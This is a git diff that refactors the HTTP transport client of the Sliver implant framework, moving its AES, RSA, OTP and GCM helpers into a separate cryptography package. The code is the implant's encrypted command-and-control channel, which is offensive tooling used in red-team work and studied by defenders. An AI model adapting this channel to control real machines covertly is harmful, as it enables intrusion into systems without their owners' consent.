@@ -1,4 +1,4 @@
-package transports
+package httpclient
 
 /*
 	Sliver Implant Framework
@@ -45,6 +45,7 @@ import (
 
 	"github.com/bishopfox/sliver/implant/sliver/encoders"
 	"github.com/bishopfox/sliver/implant/sliver/proxy"
+	"github.com/bishopfox/sliver/implant/sliver/transports/cryptography"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
 )
@@ -83,7 +84,7 @@ type SliverHTTPClient struct {
 	PathPrefix string
 	Client     *http.Client
 	ProxyURL   string
-	SessionKey *AESKey
+	SessionKey *cryptography.AESKey
 	SessionID  string
 }
 
@@ -96,11 +97,11 @@ func (s *SliverHTTPClient) SessionInit() error {
 		// {{end}}
 		return errors.New("{{if .Config.Debug}}Invalid public key{{end}}")
 	}
-	sKey := RandomAESKey()
+	sKey := cryptography.RandomAESKey()
 	s.SessionKey = &sKey
 	httpSessionInit := &pb.HTTPSessionInit{Key: sKey[:]}
 	data, _ := proto.Marshal(httpSessionInit)
-	encryptedSessionInit, err := RSAEncrypt(data, publicKey)
+	encryptedSessionInit, err := cryptography.RSAEncrypt(data, publicKey)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("RSA encrypt failed %v", err)
@@ -162,7 +163,7 @@ func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 	uri := s.keyExchangeURL()
 	nonce, encoder := encoders.RandomTxtEncoder()
 	s.NonceQueryArgument(uri, nonce)
-	otpCode := GetOTPCode()
+	otpCode := cryptography.GetOTPCode()
 	s.OTPQueryArgument(uri, otpCode)
 
 	// {{if .Config.Debug}}
@@ -196,7 +197,7 @@ func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 		return nil
 	}
 
-	certErr := rootOnlyVerifyCertificate([][]byte{pubKeyBlock.Bytes}, [][]*x509.Certificate{})
+	certErr := cryptography.RootOnlyVerifyCertificate([][]byte{pubKeyBlock.Bytes}, [][]*x509.Certificate{})
 	if certErr == nil {
 		// {{if .Config.Debug}}
 		log.Printf("[http] Got a valid public key")
@@ -220,7 +221,7 @@ func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
 
 	uri := s.startSessionURL()
 	s.NonceQueryArgument(uri, nonce)
-	otpCode := GetOTPCode()
+	otpCode := cryptography.GetOTPCode()
 	s.OTPQueryArgument(uri, otpCode)
 	req := s.newHTTPRequest(http.MethodPost, uri, reqBody)
 	// {{if .Config.Debug}}
@@ -240,7 +241,7 @@ func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
 	if err != nil {
 		return err
 	}
-	sessionID, err := GCMDecrypt(*s.SessionKey, data)
+	sessionID, err := cryptography.GCMDecrypt(*s.SessionKey, data)
 	if err != nil {
 		return err
 	}
@@ -296,7 +297,7 @@ func (s *SliverHTTPClient) Poll() ([]byte, error) {
 				return nil, err
 			}
 		}
-		return GCMDecrypt(*s.SessionKey, data)
+		return cryptography.GCMDecrypt(*s.SessionKey, data)
 	}
 
 	// {{if .Config.Debug}}
@@ -310,7 +311,7 @@ func (s *SliverHTTPClient) Send(data []byte) error {
 	if s.SessionID == "" || s.SessionKey == nil {
 		return errors.New("no session")
 	}
-	reqData, _ := GCMEncrypt(*s.SessionKey, data)
+	reqData, _ := cryptography.GCMEncrypt(*s.SessionKey, data)
 
 	uri := s.sessionURL()
 	nonce, encoder := encoders.RandomEncoder()
